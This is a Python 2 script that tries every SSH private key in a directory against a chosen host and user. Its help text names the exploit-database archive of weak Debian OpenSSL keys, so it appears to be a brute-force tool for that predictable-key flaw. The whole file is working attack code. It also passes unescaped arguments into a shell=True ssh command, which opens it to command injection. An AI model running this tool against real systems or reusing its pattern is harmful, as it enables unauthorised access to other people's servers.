import optparse
import os
import subprocess


def checkSshKey(host, user, keyPath):
	"""
	Checks if the key can be used for connection.
	"""
	keyWorked = False
	shellCommand = 'ssh -l %s -i %s -o PasswordAuthentication=no %s exit > /dev/null 2>&1' % (user, keyPath, host)
	if subprocess.call(shellCommand, shell = True) == 0:
		keyWorked = True

	return keyWorked


def main():
	parser = optparse.OptionParser(add_help_option = False, usage = 'Usage: %prog -h host -u user -d dir-with-keys')
	parser.add_option('-h', dest = 'host', help = 'Host to try')
	parser.add_option('-u', dest = 'user', help = 'User to test')
	parser.add_option('-d', dest = 'keysDir', help = 'Directory with keys from https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/ sploits/5632.tar.bz2')
	(options, arguments) = parser.parse_args()
	
	if options.host is None or options.user is None or options.keysDir is None:
		parser.print_help();
		exit(1)

	if not os.path.isdir(options.keysDir):
		print "Directory with keys does not exist"
		exit(1)

	for entry in os.listdir(options.keysDir):
		path = options.keysDir + os.sep + entry
		if not path.endswith('.pub') and os.path.isfile(path):
			if checkSshKey(options.host, options.user, path):
				print "Usable key: " + path


main()

